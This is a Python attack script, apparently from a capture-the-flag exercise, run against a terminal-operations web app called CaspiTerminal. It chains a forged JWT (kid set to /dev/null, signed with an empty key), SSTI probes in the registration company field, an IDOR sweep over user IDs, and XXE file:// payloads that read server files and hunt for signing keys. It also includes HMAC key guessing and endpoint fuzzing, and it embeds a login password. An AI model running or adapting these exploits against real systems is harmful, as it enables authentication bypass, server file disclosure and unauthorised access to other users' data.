#!/usr/bin/env python3
"""round33 — SSTI via company name in portal, IDOR via sub, key file discovery"""
import requests, time, json, hmac as hm, hashlib, base64, random, string

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)[:200]

def extract(path):
    code, body = xxe(path)
    if code == 200:
        try:
            d = json.loads(body)
            return d.get("summary",{}).get("remarks","")
        except:
            return ""
    elif code == 400:
        return "[REJECTED]"
    return None

# ============================================================
print("="*70)
print("PHASE 1: SSTI VIA COMPANY NAME IN PORTAL")
print("="*70)

# Register with SSTI payload as company name
ssti_payloads = [
    ("{{7*7}}", "49"),
    ("{{config}}", "SECRET"),
    ("{{request.environ}}", "PROBE"),
]

for payload, marker in ssti_payloads:
    S2 = requests.Session()
    uid = ''.join(random.choices(string.ascii_lowercase, k=6))
    email = f"ssti_{uid}@caspiterminal.kz"

    print(f"\n  Registering with company='{payload}'...")
    try:
        r = S2.post(f"{CASPI}/api/auth/register",
            json={"email": email, "password": "Test2026!", "company": payload},
            timeout=10)
        print(f"    Register: [{r.status_code}] {r.text[:100]}")

        if r.status_code in [200, 201]:
            # Access portal
            r2 = S2.get(f"{CASPI}/portal", timeout=10)
            print(f"    Portal: [{r2.status_code}] ({len(r2.text)} bytes)")

            if r2.status_code == 200:
                # Check if company name was rendered as SSTI
                if marker in r2.text:
                    print(f"    >>> SSTI CONFIRMED! Found '{marker}' in page <<<")
                    # Extract the rendered value
                    idx = r2.text.find("Welcome,")
                    if idx >= 0:
                        welcome = r2.text[idx:idx+500]
                        print(f"    Welcome text: {welcome[:300]}")
                elif payload in r2.text:
                    print(f"    Payload echoed as-is (no SSTI)")
                else:
                    # Find what's between "Welcome, " and the closing tag
                    idx = r2.text.find("Welcome,")
                    if idx >= 0:
                        end = r2.text.find("<", idx)
                        welcome_text = r2.text[idx:end].strip()
                        print(f"    Welcome: '{welcome_text}'")
                    else:
                        print(f"    'Welcome' not found in page")
    except Exception as e:
        print(f"    Error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: IDOR VIA SUB — ACCESS OTHER USERS' PORTALS")
print("="*70)

# Forge JWTs with carrier role and different sub values
# Our real sub was 6077, try lower numbers for earlier users
for sub_id in [1, 2, 3, 4, 5, 10, 100, 1000, 6076, 6077, 6078]:
    token = jwt_forged(role="carrier", sub=sub_id, company="Test", kid="/dev/null")
    try:
        r = requests.get(f"{CASPI}/portal",
            headers={"Authorization": f"Bearer {token}"}, timeout=10)
        if r.status_code == 200:
            import re
            welcome = re.search(r'Welcome,\s*([^<]+)', r.text)
            company_name = welcome.group(1).strip() if welcome else "?"
            print(f"  sub={sub_id:6d}: [200] Company: {company_name}")
        elif r.status_code == 500:
            print(f"  sub={sub_id:6d}: [500] (user lookup failed)")
        else:
            print(f"  sub={sub_id:6d}: [{r.status_code}]")
    except Exception as e:
        print(f"  sub={sub_id:6d}: ERR {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: KEY FILE DISCOVERY VIA XXE")
print("="*70)

# The JWT uses kid="carrier" — where does it read the key from?
# Try various paths
key_paths = [
    "/app/carrier", "/app/operator", "/app/admin",
    "/app/probe", "/app/gateway", "/app/signing",
    "/app/keys/carrier", "/app/keys/operator", "/app/keys/admin",
    "/app/keys/probe", "/app/keys/gateway", "/app/keys/signing",
    "/app/secret/carrier", "/app/secret/operator", "/app/secret/probe",
    "/app/secrets/carrier", "/app/secrets/operator", "/app/secrets/probe",
    "/app/jwt/carrier", "/app/jwt/operator",
    "/app/hmac/carrier", "/app/hmac/probe",
    "/app/.keys/carrier", "/app/.keys/probe",
    # Maybe key directory mapping
    "carrier", "operator", "admin", "probe",
    # Other interesting paths
    "/app/probe_secret", "/app/probe.key",
    "/app/gateway.key", "/app/gateway_secret",
    "/app/signing_key", "/app/hmac_key",
    "/etc/caspiterminal/carrier", "/etc/caspiterminal/probe",
    "/opt/carrier", "/opt/keys/carrier",
]

for fp in key_paths:
    val = extract(fp)
    if val and val != "[REJECTED]":
        print(f"  [FOUND!] {fp}: '{val[:200]}'")
    elif val == "[REJECTED]":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: VERIFY REAL JWT KEY")
print("="*70)

# The real JWT from registration
real_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImNhcnJpZXIifQ.eyJzdWIiOjYwNzcsImNvbXBhbnkiOiJDVEZfVGVhbV9mdWJ6bnoiLCJyb2xlIjoiY2FycmllciIsImlhdCI6MTc5MDczODkyOSwiZXhwIjoxNzkwODI1MzI5fQ.hbGilalpRL6GTzVIf2y4GJo5ecXQbBKYwOzOWpT68k4"

parts = real_jwt.split(".")
msg = f"{parts[0]}.{parts[1]}"
sig_bytes = base64.urlsafe_b64decode(parts[2] + "==")

print(f"  JWT header+payload: {msg[:60]}...")
print(f"  Signature: {sig_bytes.hex()}")

# Try to find the key by testing against known file contents
test_keys = [
    (b"", "empty"),
    (b"\n", "newline"),
    (b"carrier", "word 'carrier'"),
    (b"operator", "word 'operator'"),
    (b"secret", "word 'secret'"),
    (b"CaspiTerminal", "CaspiTerminal"),
    (b"terminal_web_pw", "db password"),
    (b"5407f6317f5c", "hostname"),
    (b"5407f6317f5c\n", "hostname+nl"),
]

# Add any keys found from Phase 3
for label, key in test_keys:
    computed = hm.new(key, msg.encode(), hashlib.sha256).digest()
    match = computed == sig_bytes
    if match:
        print(f"  MATCH: key={label} ({key!r}) <<<<<<")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: PORTAL API ENDPOINT DISCOVERY")
print("="*70)

# Use the real session to explore carrier-specific endpoints
S3 = requests.Session()
r = S3.post(f"{CASPI}/api/auth/login",
    json={"email": "ctf_fubznz@caspiterminal.kz", "password": "Ctffubznz2026!"},
    timeout=10)
print(f"  Login: [{r.status_code}]")

# Try various API endpoints with carrier auth
endpoints = [
    "/api/portal/", "/api/portal/orders", "/api/portal/tickets",
    "/api/carrier/", "/api/carrier/orders", "/api/carrier/tickets",
    "/api/ops/custody/tickets", "/api/custody/tickets",
    "/api/user/", "/api/user/profile", "/api/user/orders",
    "/api/schedule/", "/api/loading/", "/api/booking/",
    "/api/auth/users", "/api/auth/user",
    "/api/partner/", "/api/partner/orders",
]

for ep in endpoints:
    try:
        r = S3.get(f"{CASPI}{ep}", timeout=5)
        if r.status_code != 404:
            print(f"  GET {ep}: [{r.status_code}] {r.text[:80]}")
    except:
        pass
    try:
        r = S3.post(f"{CASPI}{ep}", json={}, timeout=5)
        if r.status_code not in [404, 405]:
            print(f"  POST {ep}: [{r.status_code}] {r.text[:80]}")
    except:
        pass

# ============================================================
print("\n"+"="*70)
print("PHASE 6: FORGED CARRIER JWT — PORTAL ACCESS")
print("="*70)

# Test if forged JWT (kid=/dev/null) with carrier role + numeric sub works for portal
token = jwt_forged(role="carrier", sub=6077, company="CTF_Team_fubznz", kid="/dev/null")
try:
    r = requests.get(f"{CASPI}/portal",
        headers={"Authorization": f"Bearer {token}"},
        cookies={},
        timeout=10)
    if r.status_code == 200:
        import re
        welcome = re.search(r'Welcome,\s*([^<]+)', r.text)
        print(f"  Forged carrier JWT (sub=6077): [200] Welcome: {welcome.group(1) if welcome else '?'}")
    else:
        print(f"  Forged carrier JWT (sub=6077): [{r.status_code}]")
except Exception as e:
    print(f"  Error: {e}")

# Now try with string sub (like our operator JWT)
token2 = jwt_forged(role="carrier", sub="ctf", company="TestCo", kid="/dev/null")
try:
    r = requests.get(f"{CASPI}/portal",
        headers={"Authorization": f"Bearer {token2}"},
        cookies={},
        timeout=10)
    print(f"  Forged carrier JWT (sub='ctf'): [{r.status_code}]")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: CUSTODY INGEST WITH CARRIER SESSION")
print("="*70)

# Can carrier role access custody/ingest?
xml_test = '''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>TEST-001</reference>
  <tankId>T-01</tankId><product>Diesel</product>
  <grossVolume>100</grossVolume><netVolume>99</netVolume>
  <density>0.85</density><temperature>20</temperature>
  <carrier>CTF_Team_fubznz</carrier>
  <remarks>Test ticket</remarks>
</ticket>'''

try:
    r = S3.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml_test, headers={"Content-Type":"application/xml"}, timeout=10)
    print(f"  Carrier custody/ingest: [{r.status_code}] {r.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

# Can carrier access probe?
try:
    r = S3.get(f"{CASPI}/api/ops/probe/sign?device=lm-01", timeout=10)
    print(f"  Carrier probe/sign: [{r.status_code}] {r.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
